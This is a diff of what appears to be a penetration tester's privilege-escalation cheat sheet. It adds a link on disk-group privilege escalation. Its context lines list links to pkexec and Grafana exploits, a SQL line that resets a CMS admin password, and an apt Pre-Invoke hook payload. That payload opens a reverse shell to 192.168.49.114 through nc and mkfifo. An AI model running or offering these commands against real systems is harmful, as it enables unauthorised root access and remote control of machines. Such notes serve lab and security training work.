@@ -163,6 +163,7 @@
 15. https://haxx.in/files/blasty-vs-pkexec.c
 16. apt get crontab: payload - echo 'apt::Update::Pre-Invoke {"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.49.114 1234 >/tmp/f"};' > shell and put it under /etc/apt/apt.conf.d
 17. Grafana exploits:https://vk9-sec.com/grafana-8-3-0-directory-traversal-and-arbitrary-file-read-cve-2021-43798/
+18. disk priviledge escalation: https://vk9-sec.com/disk-group-privilege-escalation/
 
 **Mysql**
 1. update cms_users set password = (select md5(CONCAT(IFNULL((SELECT sitepref_value FROM cms_siteprefs WHERE sitepref_name = 'sitemask'),''),'admin'))) where username = 'admin'; root用户修改密码。
